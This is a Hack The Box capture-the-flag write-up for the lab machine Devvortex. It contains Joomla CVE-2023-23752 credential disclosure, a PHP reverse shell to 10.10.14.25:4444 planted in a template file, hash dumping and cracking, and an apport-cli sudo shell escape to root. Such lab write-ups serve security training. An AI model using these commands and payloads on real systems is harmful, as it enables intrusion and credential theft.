# HTB Write-Up: Devvortex

| Field | Details |
| --- | --- |
| Platform | [Hack The Box](https://app.hackthebox.com/machines/Devvortex) |
| Difficulty | Easy |
| OS | Linux |
| Date | October 24, 2026 |

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration — Subdomain Fuzzing & Joomla CVE-2023-23752](#enumeration-subdomain-fuzzing-joomla-cve-2023-23752)
3. [Initial Access — Joomla Template Editor RCE](#initial-access-joomla-template-editor-rce)
4. [Credential Access — Joomla DB Dump & SSH as logan](#credential-access-joomla-db-dump-ssh-as-logan)
5. [Privilege Escalation — apport-cli Sudo Abuse](#privilege-escalation-apport-cli-sudo-abuse)

## Reconnaissance

Port discovery was performed with **RustScan**:

```bash
rustscan -a 10.129.89.108 --ulimit=5000
```

**Open Ports:**

| Port | Service |
| --- | --- |
| 22 | SSH |
| 80 | HTTP |

A minimal surface — just SSH and a web server. The hostname was added for local resolution:

```bash
echo "10.129.89.108 devvortex.htb" | sudo tee -a /etc/hosts
```

## Enumeration — Subdomain Fuzzing & Joomla CVE-2023-23752

### 2.1 — Directory & Subdomain Fuzzing

Directory fuzzing against the main site turned up nothing beyond static asset folders:

```bash
ffuf -u http://devvortex.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -fs 0
```

Subdomain fuzzing was more productive:

```bash
ffuf -H "HOST: FUZZ.devvortex.htb" -u "http://devvortex.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ic -fs 154
```

**Result:**

```
dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502]
```

**`dev.devvortex.htb`** was added to `/etc/hosts` and browsed to directly.

### 2.2 — Fingerprinting Joomla

`robots.txt` disclosed a typical **Joomla** directory layout (`/administrator/`, `/api/`, `/components/`, etc.), confirmed by the admin login page at `/administrator`. Joomla's exact version is reliably readable from its manifest file:

```
http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
```

```xml
<version>4.2.6</version>
```

### 2.3 — CVE-2023-23752

Joomla 4.2.6 is vulnerable to **CVE-2023-23752** — an improper access-check in Joomla's REST API that lets an unauthenticated request reach endpoints meant to require authentication, including one that discloses site configuration:

```
http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
```

The response leaked working admin credentials: **`lewis:P4ntherg0t1n5r3c0n##`**.

## Initial Access — Joomla Template Editor RCE

### 3.1 — Planting a Webshell via the Template Editor

Logged in as `lewis` at `/administrator`, Joomla's built-in template editor provides an easy route to code execution for any admin account: **System → Site Templates → Cassiopeia → Details and Files**, then editing `error.php` directly. Its contents were replaced with a PHP reverse shell:

```php
<?php
system("bash -c 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1'");
?>
```

### 3.2 — Triggering the Shell

A listener was started:

```bash
rlwrap nc -nvlp 4444
```

And the modified template page requested directly to execute it:

```bash
curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
```

This landed a shell as `www-data`.

## Credential Access — Joomla DB Dump & SSH as logan

### 4.1 — Reading the Database Config

Joomla's own configuration file holds its database credentials in cleartext:

```bash
cat configuration.php
```

```php
public $user = 'lewis';
public $password = 'P4ntherg0t1n5r3c0n##';
public $db = 'joomla';
```

The same `lewis` credentials recovered earlier were reused here — confirming local MySQL was reachable:

```bash
ss -tulnp
# tcp LISTEN 127.0.0.1:3306
```

### 4.2 — Dumping the Users Table

```bash
mysql -h localhost -u lewis -p
```

```sql
show databases;
use joomla;
show tables;
SELECT * FROM sd4fg_users;
```

**Result:**

```
| id  | name       | username | email               | password                                                      |
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$Kb8qgnFEW8JUa4VUOy/KA.njmQSQadl.ZOxlL9E593zvZ5tzYwJuS |
```

### 4.3 — Cracking logan's Hash

```bash
hashcat -m 3200 hash1 /usr/share/wordlists/rockyou.txt
```

The bcrypt hash cracked against rockyou, giving a working password for `logan`.

### 4.4 — SSH & User Flag

```bash
ssh logan@10.129.89.116
```

```bash
cat /home/logan/user.txt
74a31c03ca50377fdc92b56e12b0a2ab
```

## Privilege Escalation — apport-cli Sudo Abuse

Sudo permissions were checked:

```bash
sudo -l
```

```
User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

**apport-cli** is Ubuntu's crash-report viewer, and its interactive report view opens a pager — which, like many pagers, supports dropping into a shell. Running it with elevated rights turns that shell escape into a root shell:

```bash
sudo /usr/bin/apport-cli -f
```

Navigating the interactive menu (selecting a report, viewing it, then invoking the pager's shell command) dropped into a root shell:

```
1
2
v
v
!/bin/bash
```

```bash
root@devvortex:/home/logan# cd /root/
root@devvortex:~# cat root.txt
e9d84ee5072a30954c4969f61da31890
```
